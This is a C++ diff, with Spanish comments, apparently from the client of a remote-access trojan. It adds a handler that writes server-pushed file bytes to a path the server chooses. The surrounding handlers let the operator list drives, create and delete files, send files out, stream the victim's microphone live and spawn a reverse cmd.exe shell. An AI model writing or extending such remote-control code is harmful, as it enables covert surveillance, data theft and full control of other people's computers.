@@ -76,7 +76,7 @@ bool Cliente::bConectar(const char* cIP, const char* cPuerto) {
 void Cliente::MainLoop() {
 
     //Esperar por comandos
-    char cBuffer[1024];
+    char cBuffer[1024 * 100]; //100 kb (transferencia de archivos)
     memset(&cBuffer, 0, sizeof(cBuffer));
     while (this->isRunning) {
         //Limpiar el buffer
@@ -88,17 +88,14 @@ void Cliente::MainLoop() {
 #ifdef ___DEBUG_
         std::cout<<"Esperando comando\n";
 #endif
-        int iRecibido = this->cRecv(this->sckSocket, cBuffer, 1024, false);
+        int iRecibido = this->cRecv(this->sckSocket, cBuffer, sizeof(cBuffer), false);
 
         if (iRecibido <= 0 && GetLastError() != WSAEWOULDBLOCK) {
             //No se pudo recibir nada
             break;
         }
-#ifdef ___DEBUG_
-        std::cout << "[SERVIDOR] " << cBuffer << "\n";
-#endif
-        //Partir maximo 50 parametros
-        this->ProcesarComando(strSplit(cBuffer, '~', 50));
+
+        this->ProcesarComando(cBuffer, iRecibido);
 
     }
 
@@ -115,11 +112,60 @@ void Cliente::MainLoop() {
     }
 }
 
-void Cliente::ProcesarComando(std::vector<std::string> strIn) {
+void Cliente::ProcesarComando(char* pBuffer, int iSize) {
+
+    std::vector<std::string> strIn = strSplit(std::string(pBuffer), '~', 1);
     if (strIn.size() == 0) {
         //No hay comandos
         return;
     }
+
+    if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Descargar_Archivo_Recibir){
+        // CMD + 1, resto son bytes
+        int iHeaderSize = std::to_string(EnumComandos::FM_Descargar_Archivo_Recibir).size() + 1;
+        char *cBytes = pBuffer + iHeaderSize;
+        if(this->fpArchivo != nullptr){
+            int iEscrito = fwrite(cBytes, sizeof(char), iSize - iHeaderSize, this->fpArchivo);
+#ifdef ___DEBUG_
+        std::cout<<"[!] "<<iEscrito<<" escritos"<<std::endl;
+#endif
+        }
+        return;
+    }
+
+    if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Descargar_Archivo_End){
+        if(this->fpArchivo != nullptr){
+            fclose(this->fpArchivo);
+        }
+        DebugPrint("[!] Descarga completa");
+        return;
+    }
+
+    if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Descargar_Archivo_Init){
+        strIn = strSplit(std::string(pBuffer), '~', 4);
+        if(strIn.size() == 3){
+#ifdef ___DEBUG_
+            std::cout<<"[!] Descargando archivo en ruta "<<strIn[1]<<" | size: "<<strIn[2]<<std::endl;
+#endif
+            if((this->fpArchivo = fopen(strIn[1].c_str(), "wb")) == nullptr){
+#ifdef ___DEBUG_
+                std::cout<<"[X] No se pudo abrir el archivo "<<strIn[1]<<std::endl;
+                error();
+#endif
+            }
+        } else {
+#ifdef ___DEBUG_
+            std::cout<<"[X] Error parseando comando: "<<pBuffer<<std::endl;
+#endif
+        }
+        return;
+    }
+
+#ifdef ___DEBUG_
+        std::cout << "[SERVIDOR] " << pBuffer << "\n";
+#endif
+    strIn = strSplit(std::string(pBuffer), '~', 4);
+
     int iEnviado = 0;
     
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::PING) {
@@ -129,12 +175,14 @@ void Cliente::ProcesarComando(std::vector<std::string> strIn) {
         std::string strComand = std::to_string(EnumComandos::PONG);
         strComand.append(1, '\\');
         iEnviado = this->cSend(this->sckSocket, strComand.c_str(), strComand.size()+1, 0, false);
+        return;
     }
 
     if (strIn[0] == "CUSTOM_TEST") {
         std::string strTest = "03\\";
         strTest += RandomID(7);
         iEnviado = this->cSend(this->sckSocket, strTest.c_str(), strTest.size(), 0, false);
+        return;
     }
 
     //Listar drives
@@ -162,7 +210,7 @@ void Cliente::ProcesarComando(std::vector<std::string> strIn) {
         strDipositivos = strDipositivos.substr(0, strDipositivos.length() - 1);
         
         this->cSend(this->sckSocket, strDipositivos.c_str(), strDipositivos.size() + 1, 0, false);
-
+        return;
     }
 
 
@@ -200,21 +248,25 @@ void Cliente::ProcesarComando(std::vector<std::string> strIn) {
             Sleep(10);
             //std::cout << strCommand << std::endl;
         }
+        return;
     }
 
     //crear folder
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Crear_Folder) {
         CrearFolder(strIn[1].c_str());
+        return;
     }
 
     //Crear archivo
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Crear_Archivo) {
         CrearArchivo(strIn[1].c_str());
+        return;
     }
 
     //Borrar archivo
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Borrar_Archivo) {
         BorrarArchivo(strIn[1].c_str());
+        return;
     }
 
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Descargar_Archivo) {
@@ -223,11 +275,10 @@ void Cliente::ProcesarComando(std::vector<std::string> strIn) {
         //auto ptr = std::shared_ptr<Cliente>(this);
         std::thread th(&EnviarArchivo, param1, param2, this);
         th.detach();
-        //EnviarArchivo(strIn[1].c_str(), strIn[2].c_str(), this);
+        return;
     }
     //#####################################################
     //#####################################################
-
 
 
     //Lista de dispositivos de entrada (mic)
@@ -242,7 +293,7 @@ void Cliente::ProcesarComando(std::vector<std::string> strIn) {
         
         this->mod_Mic->sckSocket = this->sckSocket;
         this->mod_Mic->m_Enviar_Dispositivos();
-
+        return;
     }
 
     //Escuchar mic en tiempo real
@@ -253,6 +304,7 @@ void Cliente::ProcesarComando(std::vector<std::string> strIn) {
         this->mod_Mic->sckSocket = this->sckSocket;
         this->mod_Mic->p_DeviceID = atoi(strIn[1].c_str());
         this->mod_Mic->m_EmpezarLive();
+        return;
     }
 
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::Mic_Detener_Escucha) {
@@ -264,6 +316,7 @@ void Cliente::ProcesarComando(std::vector<std::string> strIn) {
         Sleep(100);
         delete this->mod_Mic;
         this->mod_Mic = nullptr;
+        return;
     }
 
     //Iniciar shell
@@ -275,7 +328,8 @@ void Cliente::ProcesarComando(std::vector<std::string> strIn) {
         }
         this->reverseSHELL = new ReverseShell(this);
         this->reverseSHELL->sckSocket = this->sckSocket;
-        this->reverseSHELL->SpawnShell("C:\\Windows\\System32\\cmd.exe");        
+        this->reverseSHELL->SpawnShell("C:\\Windows\\System32\\cmd.exe");     
+        return;   
     }
 
     //Escribir comando a la shell
@@ -300,6 +354,7 @@ void Cliente::ProcesarComando(std::vector<std::string> strIn) {
 #endif
             }
         }
+        return;
     }
 
 #ifdef ___DEBUG_
